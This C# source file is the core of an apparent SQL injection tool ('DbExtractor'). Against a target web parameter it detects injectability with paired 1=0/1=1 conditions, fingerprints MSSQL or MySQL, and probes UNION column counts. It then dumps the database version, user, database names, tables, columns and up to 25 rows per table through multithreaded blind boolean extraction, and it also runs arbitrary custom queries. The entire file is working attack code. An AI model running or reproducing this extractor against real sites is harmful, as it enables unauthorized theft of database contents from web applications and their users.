using System;
using System.Collections.Generic;
using System.Threading;
using ToolSet.DatabaseExtractorCode.DBExtractor;

namespace ToolSet.DatabaseExtractorCode
{
   internal class DbExtractor
   {
      #region Properties

      private bool _encodeCharacter;

      private bool _encodeWhiteSpace;
      private ExtractorInfos _extractingInfos;
      private int _maxColumns;

      private int _minColumns;
      private bool _userStop;

      public bool EncodeCharacter
      {
         get { return _encodeCharacter; }
         set { _encodeCharacter = value; }
      }

      public bool EncodeWhiteSpace
      {
         get { return _encodeWhiteSpace; }
         set { _encodeWhiteSpace = value; }
      }

      public int MinColumns
      {
         get { return _minColumns; }
         set { if (value >= 1) _minColumns = value; }
      }

      public int MaxColumns
      {
         get { return _maxColumns; }
         set { if (value >= 1) _maxColumns = value; }
      }

      public ExtractorInfos ExtractingInfos
      {
         get { return _extractingInfos; }
      }

      public bool UserStop
      {
         get { return _userStop; }
         set { _userStop = value; }
      }

      #endregion

      #region Private

      private readonly InjectPatterns _injectionPatterns;
      private readonly InternalData _internalData;
      private readonly QueryConstructor.QueryConstructor _queryConstructor;
      private InjectingClass _injector;
      private string _lastQueryOutput;
      private RequestManager _reqManager;
      private List<Request> _requestList;
      private ManualResetEvent _requestsComplete;
      private InjectionInfos _injectInfos;
      private RequestConstructor _requestConstructor;

      #endregion

      public DbExtractor()
      {
         //Properties
         _encodeCharacter = false;
         _encodeWhiteSpace = false;
         _minColumns = 1;
         _maxColumns = 20;
         _extractingInfos = new ExtractorInfos();

         // Private
         _injectionPatterns = new InjectPatterns();
         _internalData = new InternalData();
         _queryConstructor = new QueryConstructor.QueryConstructor();
         _injectInfos = new InjectionInfos();
         _requestList = new List<Request>();
         _lastQueryOutput = string.Empty;
         _reqManager = new RequestManager();
         _reqManager.RequestFinished += ReqManagerRequestFinished;
         _requestsComplete = new ManualResetEvent(false);
         _injector = new InjectingClass();
         _userStop = false;
      }

      public void UserStopMethod()
      {
         _userStop = true;
      }

      public void UserStartMethod()
      {
         _userStop = false;
      }

      private void ReqManagerRequestFinished(Request req)
      {
         _requestList.Add(req);

         ExtractingInfos.Requests.Add(req.URL);
         if (_requestList.Count == 8)
         {
            string binaryString = string.Empty;
            for (int i = 0; i < _requestList.Count; i++)
            {
               if (QuerySuccessfull(_requestList[i].HTML))
                  binaryString += "1";
               else
                  binaryString += "0";
            }

            if (!binaryString.Contains("1") || _userStop)
            {
               _reqManager.Stop();
               _requestsComplete.Set();
               return;
            }

            _lastQueryOutput += BinaryToString(binaryString);
            ExtractingInfos.CurrentQueryOutput = _lastQueryOutput;

            _requestList.Clear();
            if (!_userStop)
            {
               BuildRequestsCharacter(req.Function, req.DataBaseType, (req.NaturalRequestNr + 1) / 8 + 1);

               if (_reqManager.Count() == 0)
               {
                  _reqManager.Stop();
                  _requestsComplete.Set();
                  _extractingInfos.Status.Add("Finished");
                  _extractingInfos.CurrentTestFinished = true;
               }
            }
         }
      }

      public void Prepare(InjectionInfos injectInfos)
      {
         _userStop = false;
         _requestList = new List<Request>();
         _extractingInfos = new ExtractorInfos();
         _lastQueryOutput = string.Empty;
         _injector = new InjectingClass();
         _injectInfos = injectInfos;
         _requestConstructor = new RequestConstructor(injectInfos)
                                  {
                                     EncodeCharacters = _encodeCharacter,
                                     EncodeWhiteSpace = _encodeWhiteSpace
                                  };
         _internalData.Prepared = true;
         _internalData.UseConditions = true;
      }

      public void TestParameterInjectable()
      {
         if (!_internalData.Prepared)
            return;
         _extractingInfos.Status.Add("Beginning tests if parameter is injectable");
         _extractingInfos.CurrentTestComplete = false;

         _internalData.ParameterInjectable = false;
         _extractingInfos.Status.Add("Sending requests");
         foreach (string anfang in _injectionPatterns.Begin)
         {
            if (_internalData.ParameterInjectable)
               break;

            foreach (string ende in _injectionPatterns.End)
            {
               if (_internalData.ParameterInjectable)
                  break;

               foreach (string condition in _injectionPatterns.Conditions)
               {
                  if (_userStop)
                     return;
                  string queryFailed = anfang + condition + "1=0" + ende;
                  _requestConstructor.InsertQuery(queryFailed);
                  string htmlFailed = SendWebrequest(_requestConstructor.GetURL(), _requestConstructor.GetPOST());

                  string querySuccess = anfang + condition + "1=1" + ende;
                  _requestConstructor.InsertQuery(querySuccess);
                  string htmlSuccess = SendWebrequest(_requestConstructor.GetURL(), _requestConstructor.GetPOST());


                  if (htmlSuccess.Contains(_injectInfos.Success) && !htmlFailed.Contains(_injectInfos.Success))
                  {
                     _internalData.InjectableBegin = anfang;
                     _internalData.InjectableEnd = ende;
                     _internalData.InjectableCondition = condition;
                     _internalData.ParameterInjectable = true;
                     break;
                  }
               }
            }
         }
         ExtractingInfos.ParameterInjectable = _internalData.ParameterInjectable;
         _injector.InjectBegin = _internalData.InjectableBegin;
         _injector.InjectEnd = _internalData.InjectableEnd;
         _injector.InjectCondition = _internalData.InjectableCondition;

         if (_internalData.ParameterInjectable)
         {
            _extractingInfos.Status.Add("Parameter is injectable");
            GetDatabaseType();

            if (_internalData.ParameterInjectable)
            {
               List<string> unions =
                  _injector.InjectUnionQueries(_queryConstructor.GetUnionQueries(_minColumns, _maxColumns,
                                                                                 _internalData.DataBaseType));
               for (int i = 0; i < unions.Count; i++)
               {
                  _requestConstructor.InsertQuery(unions[i]);
                  string unionRequest = SendWebrequest(_requestConstructor.GetURL(), _requestConstructor.GetPOST());
                  if (unionRequest.Contains("___ll12344321ll___"))
                  {
                     if (_internalData.DataBaseType == DataBaseType.Mssql)
                     {
                        int indexBegin = unions[i].IndexOf("CAST(");
                        _injector.UnionQueryBegin = unions[i].Substring(0, indexBegin + 5) + "(";

                        int indexEnd = unions[i].IndexOf(" as varchar)");
                        _injector.UnionQueryEnd = ")" + unions[i].Substring(indexEnd);
                     }
                     else if (_internalData.DataBaseType == DataBaseType.MySql)
                     {
                        int indexBegin = unions[i].IndexOf("CONCAT(0x5f5f5f6c6c,");
                        _injector.UnionQueryBegin = unions[i].Substring(0, indexBegin + "CONCAT(0x5f5f5f6c6c,".Length) +
                                                    "(";

                        int indexEnd = unions[i].IndexOf(",0x6c6c5f5f5f)");
                        _injector.UnionQueryEnd = ")" + unions[i].Substring(indexEnd);
                     }

                     _internalData.UseConditions = false;
                     break;
                  }
               }
               GetDatabaseInfos();
            }
         }
         else
         {
            _extractingInfos.Status.Add("Parameter is not injectable");
            _extractingInfos.Status.Add("Finished");
         }
         _extractingInfos.CurrentTestComplete = true;
      }

      private void GetDatabaseType()
      {
         if (!_userStop)
         {
            _extractingInfos.Status.Add("Getting Database type");
            BuildRequests("LTRIM(1)", DataBaseType.Mssql);
            if (_lastQueryOutput == "1")
            {
               _internalData.DataBaseType = DataBaseType.Mssql;
               _extractingInfos.Status.Add("Database type is MSSQL");
               _extractingInfos.DatabaseType = "MSSQL";
            }
         }
         if (!_userStop)
         {
            BuildRequests("CONCAT(0x31,0x31)", DataBaseType.MySql);
            if (_lastQueryOutput == "11")
            {
               _internalData.DataBaseType = DataBaseType.MySql;
               _extractingInfos.Status.Add("Database type is MySQL");
               _extractingInfos.DatabaseType = "MySQL";
            }
         }
         if (!_userStop)
         {
            if (_internalData.DataBaseType == DataBaseType.Unknown)
            {
               _internalData.ParameterInjectable = false;
               _extractingInfos.Status.Add("Could not get Database type");
               _extractingInfos.Status.Add("Finished");
            }
         }
      }

      public void GetDatabaseInfos()
      {
         if (!_internalData.ParameterInjectable || _userStop)
            return;
         _extractingInfos.CurrentTestComplete = false;
         if (!_userStop)
         {
            _extractingInfos.Status.Add("Getting Version");
            string version = BuildRequests(_queryConstructor.DbGetVersion(_internalData.DataBaseType),
                                           _internalData.DataBaseType);
            _extractingInfos.Version = version;
         }
         if (!_userStop)
         {
            _extractingInfos.Status.Add("Getting database name");
            string currentDatabase = BuildRequests(_queryConstructor.DbGetDatabase(_internalData.DataBaseType),
                                                   _internalData.DataBaseType);
            _extractingInfos.CurrentDatabaseName = currentDatabase;
         }
         if (!_userStop)
         {
            _extractingInfos.Status.Add("Getting user");
            string currentUser = BuildRequests(_queryConstructor.DbGetUser(_internalData.DataBaseType),
                                               _internalData.DataBaseType);
            _extractingInfos.User = currentUser;
         }
         _extractingInfos.CurrentTestComplete = true;
         _extractingInfos.Status.Add("Pretests done");
      }

      private string BuildRequests(string function, DataBaseType db)
      {
         if (_internalData.UseConditions)
         {
            _extractingInfos.Status.Add("Start asynchron requests");
            _requestList.Clear();
            _lastQueryOutput = string.Empty;

            _reqManager = new RequestManager
                             {
                                CustomCookieCollection = _injectInfos.CustomCookieCollection
                             };
            _reqManager.RequestFinished += ReqManagerRequestFinished;
            _reqManager.StartThreads(4);
            BuildRequestsCharacter(function, db, 1);

            _requestsComplete = new ManualResetEvent(false);
            var wh = new WaitHandle[] { _requestsComplete };
            WaitHandle.WaitAny(wh, -1, false);
            _extractingInfos.Status.Add("Asynchron requests complete");
            return _lastQueryOutput;
         }


         _requestConstructor.InsertQuery(_injector.InjectUnionQuery(function));
         string html = SendWebrequest(_requestConstructor.GetURL(), _requestConstructor.GetPOST());
         int indexBegin = html.IndexOf("___ll");
         if (indexBegin == -1)
            return string.Empty;
         html = html.Remove(0, indexBegin + 5);

         int indexEnd = html.IndexOf("ll___");
         if (indexEnd == -1)
            return string.Empty;
         html = html.Remove(indexEnd);

         return html;

      }


      private void BuildRequestsCharacter(string function, DataBaseType db, int charPos)
      {
         {
            List<string> queries = _injector.InjectConditionQueries(function, charPos, 0, 128, db);

            for (int i = 0; i < queries.Count; i++)
            {
               if (_userStop)
                  return;
               string query = queries[i];
               _requestConstructor.InsertQuery(query);
               SendAsyncWebrequest(_requestConstructor.GetURL(), _requestConstructor.GetPOST(), function, db);
            }
         }
      }

      private static string BinaryToString(string binaryString)
      {
         if (binaryString.Length == 0)
            return string.Empty;

         string binaryStringReversed = string.Empty;
         for (int i = (binaryString.Length - 1); i >= 0; i--)
            binaryStringReversed += binaryString[i].ToString();

         string text = Convert.ToChar(Convert.ToInt32(binaryStringReversed, 2)).ToString();
         return text;
      }

      private bool QuerySuccessfull(string html)
      {
         if (html.Contains(_injectInfos.Success))
            return true;

         return false;
      }

      public void GetDatabases()
      {
         if (!_internalData.ParameterInjectable || _userStop)
            return;

         _extractingInfos.Status.Add("Getting databases");
         _extractingInfos.CurrentTestComplete = false;
         _extractingInfos.DatabaseInfos.Clear();

         string databaseCount = BuildRequests(_queryConstructor.GetDatabaseCountQuery(_internalData.DataBaseType),
                                              _internalData.DataBaseType);

         int iDatabaseCount = Convert.ToInt32(databaseCount);
         for (int i = 0; i < iDatabaseCount; i++)
         {
            string databaseName = BuildRequests(_queryConstructor.GetDatabaseNameQuery(_internalData.DataBaseType, i),
                                                _internalData.DataBaseType);
            _extractingInfos.DatabaseInfos.Add(new DatabaseInfo { DatabaseName = databaseName });
         }
         _extractingInfos.Status.Add("Done: Adding database");
         _extractingInfos.CurrentTestComplete = true;
      }

      public void GetTables(object dbIndex)
      {
         GetTables((int)dbIndex);
      }

      private void GetTables(int dbIndex)
      {
         if (!_internalData.ParameterInjectable || _userStop)
            return;
         if (dbIndex > _extractingInfos.DatabaseInfos.Count || dbIndex < 0)
            return;

         _extractingInfos.Status.Add("Getting tables");
         _extractingInfos.CurrentTestComplete = false;
         _extractingInfos.DatabaseInfos[dbIndex].Tables.Clear();

         string tabellenAnz = BuildRequests(
            _queryConstructor.TabellenAnzahl(_extractingInfos.DatabaseInfos[dbIndex].DatabaseName,
                                             _internalData.DataBaseType), _internalData.DataBaseType);

         int iTableCount = -1;

         if (Int32.TryParse(tabellenAnz, out iTableCount))
         {
            for (int i = 0; i < iTableCount; i++)
            {
               string tabellenName = BuildRequests(
                  _queryConstructor.GetTabellenNamenQuery(_extractingInfos.DatabaseInfos[dbIndex].DatabaseName, i,
                                                          _internalData.DataBaseType), _internalData.DataBaseType);

               _extractingInfos.DatabaseInfos[dbIndex].Tables.Add(new Table { TableName = tabellenName });
            }
         }
         _extractingInfos.Status.Add("Done: Adding tables");
         _extractingInfos.CurrentTestComplete = true;
      }

      public void GetColumns(object parameter)
      {
         string[] split = parameter.ToString().Split(',');
         GetColumns(Convert.ToInt32(split[0]), Convert.ToInt32(split[1]));
      }

      private void GetColumns(int dbIndex, int tableIndex)
      {
         if (!_internalData.ParameterInjectable || _userStop)
            return;
         if (dbIndex > _extractingInfos.DatabaseInfos.Count || dbIndex < 0)
            return;

         _extractingInfos.Status.Add("Getting columns");
         _extractingInfos.CurrentTestComplete = false;
         _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields.Clear();

         string feldanzahl = BuildRequests(
            _queryConstructor.GetFeldAnzahlQuery(_extractingInfos.DatabaseInfos[dbIndex].DatabaseName,
                                                 _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].TableName,
                                                 _internalData.DataBaseType), _internalData.DataBaseType);

         int iFeldanzahl = Convert.ToInt32(feldanzahl);
         for (int i = 0; i < iFeldanzahl; i++)
         {
            string feldName =
               BuildRequests(
                  _queryConstructor.GetFeldNamenQuery(_extractingInfos.DatabaseInfos[dbIndex].DatabaseName,
                                                      _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].
                                                         TableName,
                                                      i, _internalData.DataBaseType), _internalData.DataBaseType);
            string feldTyp =
               BuildRequests(
                  _queryConstructor.GetFeldTypQuery(_extractingInfos.DatabaseInfos[dbIndex].DatabaseName,
                                                    _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].TableName,
                                                    feldName, _internalData.DataBaseType), _internalData.DataBaseType);

            _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields.Add(new Field
                                                                                     {
                                                                                        FeldName = feldName,
                                                                                        FeldTyp = feldTyp
                                                                                     });
         }
         _extractingInfos.Status.Add("Done: Adding columns");
         _extractingInfos.CurrentTestComplete = true;
      }

      public void GetRows(object parameter)
      {
         string[] split = parameter.ToString().Split(',');
         GetRows(Convert.ToInt32(split[0]), Convert.ToInt32(split[1]));
      }

      private void GetRows(int dbIndex, int tableIndex)
      {
         if (!_internalData.ParameterInjectable || _userStop)
            return;
         if (dbIndex > _extractingInfos.DatabaseInfos.Count || dbIndex < 0)
            return;

         _extractingInfos.Status.Add("Getting rows");
         _extractingInfos.CurrentTestComplete = false;

         string databaseName = _extractingInfos.DatabaseInfos[dbIndex].DatabaseName;
         string tabellenName = _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].TableName;

         string Rows;
         Rows = BuildRequests(
            _queryConstructor.GetDatarowsCount(databaseName, tabellenName, _internalData.DataBaseType),
            _internalData.DataBaseType);

         int iRows = Convert.ToInt32(Rows);
         string orderBySpalte = string.Empty;
         for (int iRow = 0; iRow < 25 && iRow < iRows; iRow++)
         {
            for (int i = 0; i < _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields.Count; i++)
            {
               if (iRow == 0)
                  _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields[i].FeldWert.Clear();

               string feldName = _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields[i].FeldName;

               //string FeldWertLänge = string.Empty;
               //FeldWertLänge = BuildRequests(queryConstructor.GetDatarowsLength(DatabaseName, TabellenName, FeldName, iRow, internalData.DataBaseType), internalData.DataBaseType);
               //int iFeldWertLänge = Convert.ToInt32(FeldWertLänge);
               if (orderBySpalte.Length == 0)
               {
                  for (int iSpaltepk = 0;
                       iSpaltepk < _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields.Count;
                       iSpaltepk++)
                  {
                     string feldTypNeu =
                        _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields[iSpaltepk].FeldTyp;
                     string feldNameNeu =
                        _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields[iSpaltepk].FeldName;
                     if (feldTypNeu == "int")
                        if (feldNameNeu.ToLower() == "id" || feldNameNeu.ToLower() == "pk" ||
                            feldNameNeu.ToLower() == "nr" || feldNameNeu.ToLower() == "index")
                        {
                           orderBySpalte =
                              _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields[iSpaltepk].FeldName;
                           break;
                        }
                  }
               }

               if (orderBySpalte.Length == 0)
               {
                  for (int iSpalte = 0;
                       iSpalte < _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields.Count;
                       iSpalte++)
                  {
                     string feldTypNeu =
                        _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields[iSpalte].FeldTyp;
                     if (feldTypNeu != "text" && feldTypNeu != "ntext" && feldTypNeu != "image")
                     {
                        orderBySpalte =
                           _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields[iSpalte].FeldName;
                        break;
                     }
                  }
               }


               string feldWert =
                  BuildRequests(
                     _queryConstructor.GetDatarowValue(databaseName, tabellenName, feldName, iRow, orderBySpalte,
                                                       _internalData.DataBaseType), _internalData.DataBaseType);
               _extractingInfos.DatabaseInfos[dbIndex].Tables[tableIndex].Fields[i].FeldWert.Add(feldWert);
            }
         }

         _extractingInfos.Status.Add("Done: Adding rows");
         _extractingInfos.CurrentTestComplete = true;
      }

      public string ExecuteCustomQuery(string query)
      {
         if (_internalData.ParameterInjectable)
         {
            string output = BuildRequests(query, _internalData.DataBaseType);
            if (output == string.Empty)
               return "query failed or nothing to display";

            return output;
         }
         return "Parameter is not injectable";
      }


      private string SendWebrequest(string url, string post)
      {
         var request = new CreateWebrequest
                          {
                             CustomCookieCollection = _injectInfos.CustomCookieCollection
                          };

         string html = request.StringGetWebPage(url, post);
         ExtractingInfos.Requests.Add(url);

         return html;
      }

      private void SendAsyncWebrequest(string url, string post, string function, DataBaseType dataBase)
      {
         if (!_userStop)
            _reqManager.AddRequest(new Request { URL = url, POST = post, Function = function, DataBaseType = dataBase });
      }
   }
}